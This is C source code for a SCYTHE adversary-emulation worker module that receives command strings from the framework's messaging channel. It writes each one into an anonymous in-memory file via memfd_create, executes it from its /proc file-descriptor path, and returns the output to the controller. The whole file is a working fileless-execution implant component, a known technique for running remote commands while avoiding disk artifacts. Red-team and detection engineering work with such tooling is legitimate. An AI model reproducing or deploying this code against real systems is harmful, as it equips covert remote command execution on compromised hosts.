/*++

 Copyright (c) SCYTHE, Inc. Use is subject to agreement.

 --*/
#define _GNU_SOURCE
#include "common.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define MAX_BUF_SIZE 4096
//#define COMMAND "/usr/bin/cat\0"
#define NAME "scythe\0"

char* exec_on_proc(const char *cmd);

PSCYTHE_CLIENT g_pClient = NULL;

// {5bab5be0-a182-11ec-992e-6fb98c417f58}
static const GUID ubashModuleId =
{ 0x5bab5be0, 0xa182, 0x11ec, { 0x99, 0x2e, 0x6f, 0xb9, 0x8c, 0x41, 0x7f, 0x58}};

static const SCYTHE_MODULE_TYPE ubashModuleType = CATEGORY_WORKER;

INT init(PSCYTHE_CLIENT pClient, PVOID pvReserved)
{
    g_pClient = pClient;
     
    return SCYTHE_NOERROR;
}

ERROR_T run(PSCYTHE_MESSAGE pMessage, PVOID pvReserved)
{
    ERROR_T status = SCYTHE_NOERROR;

    char *resp = exec_on_proc(pMessage->Message);       
    status = g_pClient->PostToMessagingSubsystem(pMessage->MessageId, 0, 0,
        CATEGORY_OUTPUT_COMMUNICATION,
        &ubashModuleId,
        NULL,
        strlen(resp), (PBYTE)resp);
    
    return status;
}

ERROR_T getinfo(PSCYTHE_MODULE_INFORMATION pInformation)
{
    ERROR_T status = SCYTHE_ERROR_INVALID_PARAMETER;

    if (NULL != pInformation)
    {
        if (pInformation->cbSize >= sizeof(SCYTHE_MODULE_INFORMATION))
        {
            pInformation->ModuleVersion.wMajor = 1;
            pInformation->ModuleVersion.wMinor = 0;
            pInformation->ModuleType = ubashModuleType;
            memcpy(&(pInformation->ModuleId), &ubashModuleId, sizeof(GUID));
            status = SCYTHE_NOERROR;
        }
    }

    return status;
}

// Required function: deinit
ERROR_T deinit(PVOID pvReserved)
{
    return SCYTHE_NOERROR;
}

char* exec_on_proc(const char *command){
  pid_t pid;
  FILE *output = NULL;
  char recvBuf[MAX_BUF_SIZE + 1] = {0};
  
  int fds[2], status, tmpfd;
  size_t commandSize = 0;
  const char *execPath = "/proc/%ld/fd/%d\0";
  char *commandPath = NULL;
  char *args[3] = { 0 };
  
  // create temporary RAM file

  tmpfd = memfd_create(NAME, MFD_ALLOW_SEALING);
  if (tmpfd == -1)
      return "[!] Error: memfd_create failed";

  if (ftruncate(tmpfd, MAX_BUF_SIZE) == -1)
      return "[!] Error: truncation error occurred";
 
  write(tmpfd, command, strlen(command));
  char *resp;
  asprintf(&resp,"PID: %ld; fd: %d; /proc/%ld/fd/%d",
     (long) getpid(), tmpfd, (long) getpid(), tmpfd);

  // take 4194304 (/proc/sys/kernel/pid_max) into account
  commandPath = malloc(sizeof(execPath) - 5 + 7 + 1);
  memset(commandPath, 0, sizeof(execPath) - 5 + 7 + 1);
  asprintf(&commandPath, execPath, (long) getpid(), tmpfd);
  chmod(commandPath, 0740);
  // set up the pipe
  if (pipe(fds)==-1)
    return "[!] Error: pipe died";

  if ((pid = fork()) == -1)
    return "[!] Error: Fork failed";

  // child process
  if(pid == 0) {
    close(fds[0]);
    dup2(fds[1], STDOUT_FILENO);
    args[0] = commandPath;
    execv(commandPath, args);
  }
  waitpid(-1, &status, 0);

  if (!WIFEXITED(status))
     return "[!] Error: child process failed to execute...";

  close(fds[1]);
  output = fdopen(fds[0], "r");
  fread(recvBuf, 1, MAX_BUF_SIZE, output);
  fclose(output);
  asprintf(&resp,": %s",recvBuf);
  close(fds[0]);
  free(commandPath);
  close(tmpfd);
  return resp;
  
}